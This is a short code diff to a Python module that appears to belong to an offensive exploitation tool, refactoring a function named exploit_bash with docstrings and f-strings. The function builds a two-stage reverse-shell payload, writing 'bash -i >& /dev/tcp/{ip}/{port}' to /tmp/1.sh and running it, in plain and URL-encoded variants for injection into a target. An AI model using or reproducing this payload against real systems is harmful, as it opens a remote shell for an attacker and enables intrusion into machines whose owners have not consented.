@@ -1,7 +1,7 @@
+"""Bash"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
@@ -9,7 +9,7 @@ from src.utils import colors
 
 
 def exploit_bash(exploit, method, ip, port):
-
+    """Exploit Bash"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
@@ -20,14 +20,14 @@ def exploit_bash(exploit, method, ip, port):
     if method == "INPUT" and config.tempArg not in url:
         bashTest = "which bash"
         bashPayloadStageOne = (
-            "echo 'bash -i >& /dev/tcp/" + ip + "/" + str(port) + "+0>&1'>/tmp/1.sh"
+            f"echo 'bash -i >& /dev/tcp/{ip}/{port}+0>&1'>/tmp/1.sh"
         )
         bashPayloadStageTwo = "bash /tmp/1.sh"
 
     else:
         bashTest = "which%20bash"
         bashPayloadStageOne = (
-            "echo+'bash+-i+>%26+/dev/tcp/" + ip + "/" + str(port) + "+0>%261'>/tmp/1.sh"
+            f"echo+'bash+-i+>%26+/dev/tcp/{ip}/{port}+0>%261'>/tmp/1.sh"
         )
         bashPayloadStageTwo = "bash+/tmp/1.sh"
 
